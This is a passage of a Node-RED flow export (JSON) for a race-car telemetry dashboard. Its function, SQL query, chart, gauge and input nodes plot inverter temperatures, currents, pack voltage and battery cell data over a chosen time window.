        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_module_c_temperature);\nlet series2 = msg.payload.map(item => item.inv_module_b_temperature);\nlet series3 = msg.payload.map(item => item.inv_module_a_temperature);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Module C Temperature\", \"INV Module B Temperature\", \"INV Module A Temperature\"],\n        \"data\": [series1, series2, series3],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 640,
        "wires": [
            [
                "f532b429468ce19f"
            ]
        ]
    },
    {
        "id": "b5b24d160b2a085e",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_diag_ia);\nlet series2 = msg.payload.map(item => item.inv_diag_ib);\nlet series3 = msg.payload.map(item => item.inv_diag_ic);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Diag Ia\", \"INV Diag Ib\", \"INV Diag Ic\"],\n        \"data\": [series1, series2, series3],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 700,
        "wires": [
            [
                "763a6ba5998417a2"
            ]
        ]
    },
    {
        "id": "3118857487301cfe",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_diag_iq_cmd);\nlet series2 = msg.payload.map(item => item.inv_diag_id_cmd);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Diag Iq CMD\", \"INV Diag Id CMD\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 740,
        "wires": [
            [
                "64212f27e7ed2872"
            ]
        ]
    },
    {
        "id": "7f504d5c515686cb",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_diag_vq_cmd);\nlet series2 = msg.payload.map(item => item.inv_diag_vd_cmd);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Diag Vq CMD\", \"INV Diag Vd CMD\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 820,
        "wires": [
            [
                "a239299933bef655"
            ]
        ]
    },
    {
        "id": "6ac0390839e64a7c",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_diag_pwm_freq);\n\nmsg.payload = [\n    {\n        \"series\": [\"PMW Freq\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 860,
        "wires": [
            [
                "5fd4ae9fbd270645"
            ]
        ]
    },
    {
        "id": "a57cf2d67b576307",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_fast_torque_command);\nlet series2 = msg.payload.map(item => item.inv_fast_torque_feedback);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Fast Torque Command\", \"INV Fast Torque Feedback\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 900,
        "wires": [
            [
                "73d0aa067a7b1026"
            ]
        ]
    },
    {
        "id": "6ee6fbe0faa559f8",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.bms_max_discharge_current);\nlet series2 = msg.payload.map(item => item.bms_max_charge_current);\n\nmsg.payload = [\n    {\n        \"series\": [\"BMS Max Discharge Current\", \"BMS Max Charge Current\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 940,
        "wires": [
            [
                "8d79420c84062d6b"
            ]
        ]
    },
    {
        "id": "0a1fc2c2e4cd54bd",
        "type": "MSSQL",
        "z": "58631339f9f9424f",
        "mssqlCN": "933ce03686fddbab",
        "name": "Past Data",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT *\nFROM dbo.race_data\nWHERE timestamp BETWEEN '{{payload.start_time}}' AND '{{payload.end_time}}'\nORDER BY timestamp",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "payload.selectedDateTime",
        "paramsOptType": "msg",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 740,
        "y": 300,
        "wires": [
            [
                "663eb6b854d714f7",
                "4a4dec27480cd101",
                "6dc372303b7d83fc",
                "0ff6fbc467e6461a",
                "b397c39e4e986dd7",
                "d42ca8871e523daf",
                "0dc1acdb8ad3b540"
            ]
        ]
    },
    {
        "id": "7746b790e296195c",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Convert Date & Time",
        "func": "// Extract date and time components from the incoming message\nvar start_time = msg.payload.starting_time; // Assuming date is provided by ui_date node\nvar duration = msg.payload.duration; // Assuming time is provided by ui_time node\n\nstart_time = start_time / 1000;     //Convert from milliseconds to seconds\nstart_time = start_time + 5*60*60;  //Convert to EST by adding 5 hours \n\nduration = duration * 60;    //Convert duration from minutes to seconds\n\nmsg.payload =\n{\n    start_time: start_time,\n    end_time : start_time + duration\n}\n\n// Pass the modified message to the next node in the flow\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 480,
        "y": 300,
        "wires": [
            [
                "09d043f40fc3f433",
                "0a1fc2c2e4cd54bd"
            ]
        ]
    },
    {
        "id": "09d043f40fc3f433",
        "type": "ui_text",
        "z": "58631339f9f9424f",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "payload",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 740,
        "y": 260,
        "wires": []
    },
    {
        "id": "49bd2ff51e72b80a",
        "type": "ui_text_input",
        "z": "58631339f9f9424f",
        "name": "",
        "label": "Starting Time",
        "tooltip": "",
        "group": "7f4edb2103a1ccbd",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "datetime-local",
        "delay": 300,
        "topic": "starting_time",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 80,
        "y": 280,
        "wires": [
            [
                "b920e62e40b903ed",
                "59f2f65e118fda63"
            ]
        ]
    },
    {
        "id": "9a7d94a6702275a2",
        "type": "ui_slider",
        "z": "58631339f9f9424f",
        "name": "",
        "label": "Duration (Minutes)",
        "tooltip": "",
        "group": "7f4edb2103a1ccbd",
        "order": 2,
        "width": 0,
        "height": 0,
        "passthru": true,
        "outs": "all",
        "topic": "duration",
        "topicType": "str",
        "min": 0,
        "max": "30",
        "step": 1,
        "className": "",
        "x": 90,
        "y": 320,
        "wires": [
            [
                "b920e62e40b903ed",
                "13a4fd260e3a4d4d"
            ]
        ]
    },
    {
        "id": "b920e62e40b903ed",
        "type": "join",
        "z": "58631339f9f9424f",
        "name": "",
        "mode": "custom",
        "build": "object",
        "property": "payload",
        "propertyType": "msg",
        "key": "topic",
        "joiner": "\\n",
        "joinerType": "str",
        "accumulate": true,
        "timeout": "",
        "count": "2",
        "reduceRight": false,
        "reduceExp": "",
        "reduceInit": "",
        "reduceInitType": "",
        "reduceFixup": "",
        "x": 270,
        "y": 300,
        "wires": [
            [
                "7746b790e296195c",
                "afba2c6cdbc0d02d"
            ]
        ]
    },
    {
        "id": "59f2f65e118fda63",
        "type": "ui_text",
        "z": "58631339f9f9424f",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Start",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 210,
        "y": 220,
        "wires": []
    },
    {
        "id": "13a4fd260e3a4d4d",
        "type": "ui_text",
        "z": "58631339f9f9424f",
        "group": "7f4edb2103a1ccbd",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Duration",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 240,
        "y": 380,
        "wires": []
    },
    {
        "id": "afba2c6cdbc0d02d",
        "type": "ui_text",
        "z": "58631339f9f9424f",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Func Input",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 430,
        "y": 340,
        "wires": []
    },
    {
        "id": "f83a4a84d1128840",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 5,
        "width": "10",
        "height": "6",
        "label": "Pack Current",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1310,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "89826c7c6d25c159",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 4,
        "width": "10",
        "height": "6",
        "label": "Pack Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1310,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "7a509816db6a57ee",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Average Pack Current",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1340,
        "y": 280,
        "wires": [
            []
        ]
    },
    {
        "id": "295056051f9b2e17",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Highest/Average Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#6dc700",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 320,
        "wires": [
            []
        ]
    },
    {
        "id": "ac0e2c252c97a26b",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 8,
        "width": "10",
        "height": "6",
        "label": "Low Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1330,
        "y": 360,
        "wires": [
            []
        ]
    },
    {
        "id": "4e5130e42e135b99",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 9,
        "width": "10",
        "height": "6",
        "label": "Average Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1340,
        "y": 400,
        "wires": [
            []
        ]
    },
    {
        "id": "a2624f1a1d68ffd6",
        "type": "ui_chart",
        "z": "58631339f9f9424f",
        "name": "",
        "group": "7f4edb2103a1ccbd",
        "order": 10,
        "width": "10",
        "height": "6",
        "label": "High Cell Internal Resistance",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": 1,
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1360,
        "y": 440,
        "wires": [
            []
        ]
    },
    {
        "id": "663eb6b854d714f7",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_current);\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Current\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 200,
        "wires": [
            [
                "f83a4a84d1128840"
            ]
        ]
    },
    {
        "id": "4a4dec27480cd101",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.pack_inst_voltage);\n\nmsg.payload = [\n    {\n        \"series\": [\"Pack Instant Voltage\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 240,
        "wires": [
            [
                "89826c7c6d25c159"
            ]
        ]
    },
    {
        "id": "6dc372303b7d83fc",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.average_current);\n\nmsg.payload = [\n    {\n        \"series\": [\"Average Current\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 280,
        "wires": [
            [
                "7a509816db6a57ee"
            ]
        ]
    },
    {
        "id": "0ff6fbc467e6461a",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.high_temperature);\nlet series2 = msg.payload.map(item => item.average_temperature);\n\nmsg.payload = [\n    {\n        \"series\": [\"High Temperature\", \"Average Temperature\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 320,
        "wires": [
            [
                "295056051f9b2e17"
            ]
        ]
    },
    {
        "id": "b397c39e4e986dd7",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.low_cell_voltage);\n\nmsg.payload = [\n    {\n        \"series\": [\"Low Cell Voltage\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 360,
        "wires": [
            [
                "ac0e2c252c97a26b"
            ]
        ]
    },
    {
        "id": "d42ca8871e523daf",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.average_cell_voltage);\n\nmsg.payload = [\n    {\n        \"series\": [\"Average Cell Voltage\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 400,
        "wires": [
            [
                "4e5130e42e135b99"
            ]
        ]
    },
    {
        "id": "0dc1acdb8ad3b540",
        "type": "function",
        "z": "58631339f9f9424f",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.high_cell_resistance);\n\nmsg.payload = [\n    {\n        \"series\": [\"High Cell Resistance\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1070,
        "y": 440,
        "wires": [
            [
                "a2624f1a1d68ffd6"
            ]
        ]
    },
    {
        "id": "ded35285.4448c",
        "type": "comment",
        "z": "ff20928492ae8b0d",
        "name": "Source",
        "info": "Be it serial or any other data source. ",
        "x": 130,
        "y": 200,
        "wires": []
    },
    {
        "id": "4c5b0ed0.3f24",
        "type": "ui_gauge",
        "z": "ff20928492ae8b0d",
        "name": "",
        "group": "ae0413d2.d9b4d",
        "order": 1,
        "width": "0",
        "height": "0",
        "gtype": "gage",
        "title": "Melt Temperature",
        "label": "°F",
        "format": "{{value}}",
        "min": 0,
        "max": "10",
        "colors": [
            "#00b500",
            "#e6e600",
            "#ca3838"
        ],
        "seg1": "700",
        "seg2": "900",
        "diff": false,
        "className": "",
        "x": 1192.8165588378906,
        "y": 256.0180959701538,
        "wires": []
    },
    {
        "id": "bd76261.6cd22d8",
        "type": "function",
        "z": "ff20928492ae8b0d",
        "name": "Format Y-Axis",
        "func": "msg.ui_control = {\n    options: {\n        scales: {\n            xAxes: [{\n                type: 'time',\n                time: {\n                    unit: 'minute',\n                    min: new Date(Date.now() - 5000),\n                    max: new Date()\n                }\n            }]\n        }\n    }\n};\n\n//var now = Date.now()\n//node.warn(now);\n//to change ymin\n \nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 958.7351379394531,
        "y": 219.941632270813,
        "wires": [
            [
                "c3dc683def870461"
            ]
        ]
    },
    {
        "id": "9a0df301.f6586",
        "type": "ui_text_input",
        "z": "ff20928492ae8b0d",
        "name": "",
        "label": "Ymax",
        "tooltip": "",
        "group": "881ee563.ffb7f8",
        "order": 2,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "number",
        "delay": 300,
        "topic": "0",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 730.7352905273438,
        "y": 119.94162178039551,
        "wires": [
            [
                "bd76261.6cd22d8"
            ]
        ]
    },
    {
        "id": "9d084fca.7d4e8",
        "type": "function",
        "z": "ff20928492ae8b0d",
        "name": "extract desired data",
        "func": "msg.payload = msg.payload.data2;\nreturn msg;",
        "outputs": "1",
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 720.5165176391602,
        "y": 256.9165573120117,
        "wires": [
            [
                "bd76261.6cd22d8",
                "a200c11d.69471",
                "4c5b0ed0.3f24"
            ]
        ]
    },
    {
        "id": "f23359d4.eb63b8",
        "type": "debug",
        "z": "ff20928492ae8b0d",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 390,
        "y": 360,
        "wires": []
    },
    {
        "id": "8efab9ad.031128",
        "type": "inject",
        "z": "ff20928492ae8b0d",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "value",
        "payload": "{\"INV_Control_Board_Temp\":4}",
        "payloadType": "json",
        "x": 210,
        "y": 120,
        "wires": [
            [
                "f23359d4.eb63b8"
            ]
        ]
    },
    {
        "id": "a200c11d.69471",
        "type": "debug",
        "z": "ff20928492ae8b0d",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 900.3166046142578,
        "y": 300.9165897369385,
        "wires": []
    },
    {
        "id": "ba5e439e9a91a341",
        "type": "ui-slider",
        "z": "ff20928492ae8b0d",
        "group": "35fd8ad52955b104",
        "name": "y-axis control",
        "label": "slider",
        "tooltip": "",
        "order": 2,
        "width": 0,
        "height": 0,
        "passthru": false,
        "outs": "all",
        "topic": "y_range",
        "topicType": "str",
        "thumbLabel": "true",
        "showTicks": "always",
        "min": "10",
        "max": "100",
        "step": 1,
        "className": "",
        "iconPrepend": "",
        "iconAppend": "",
        "color": "",
        "colorTrack": "",
        "colorThumb": "",
        "x": 750,
        "y": 60,
        "wires": [
            [
                "bd76261.6cd22d8",
                "87bf8f1529a69591"
            ]
        ]
    },
    {
        "id": "87bf8f1529a69591",
        "type": "debug",
        "z": "ff20928492ae8b0d",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 950,
        "y": 60,
        "wires": []
    },
    {
        "id": "ccbe61a8d22ee767",
        "type": "debug",
        "z": "ff20928492ae8b0d",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 1390,
        "y": 280,
        "wires": []
    },
    {
        "id": "b7a37e0c91bae458",
        "type": "websocket in",
        "z": "ff20928492ae8b0d",
        "name": "",
        "server": "",
        "client": "b3e921438611f1ef",
        "x": 680,
        "y": 460,
        "wires": [
            [
                "e3151425c85676c3"
            ]
        ]
    },
    {
        "id": "e3151425c85676c3",
        "type": "json",
        "z": "ff20928492ae8b0d",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 900,
        "y": 460,
        "wires": [
            [
                "8318a6105086fc91"
            ]
        ]
    },
    {
        "id": "c3dc683def870461",
        "type": "ui-chart",
        "z": "ff20928492ae8b0d",
        "group": "35fd8ad52955b104",
        "name": "Test",
        "label": "chart",
        "order": 3,
        "chartType": "line",
        "category": "value",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": "6",
        "height": "8",
        "className": "",
        "x": 1230,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "ec91d1e34f3921a3",
        "type": "inject",
        "z": "ff20928492ae8b0d",
        "name": "trigger function",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": "",
        "topic": "ignore",
        "payload": "null",
        "payloadType": "str",
        "x": 700,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "8318a6105086fc91",
        "type": "function",
        "z": "ff20928492ae8b0d",
        "name": "function 5",
        "func": "msg.payload.curr_time = Date.now()\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1060,
        "y": 460,
        "wires": [
            []
        ]
    },
    {
        "id": "1a583a649b238172",
        "type": "ui-markdown",
        "z": "ff20928492ae8b0d",
        "group": "35fd8ad52955b104",
        "name": "",
        "order": 1,
        "width": 0,
        "height": 0,
        "content": "# Markdown Content\n\n Test: {{msg?.payload.INV_Control_Board_Tem || Hello}}",
        "className": "",
        "x": 470,
        "y": 100,
        "wires": [
            []
        ]
    },
    {
